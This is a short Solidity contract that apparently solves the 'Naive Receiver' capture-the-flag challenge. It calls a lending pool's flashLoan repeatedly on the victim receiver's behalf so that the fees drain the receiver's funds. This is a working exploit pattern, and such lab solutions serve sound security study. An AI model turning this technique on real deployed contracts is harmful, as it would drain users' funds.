// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

/**
 * @title NaiveReceiverAttacker
 * @author soyccan
 * @notice Drain the receiver of all his funds by pretending him to borrow flash
 *         loans. The fees will bankrupt him.
 */
contract NaiveReceiverAttacker {
    function attack(
        address payable pool,
        address receiver,
        uint256 times
    ) public {
        for (uint256 i = 0; i < times; i++)
            NaiveReceiverLenderPool(pool).flashLoan(receiver, 0);
    }
}
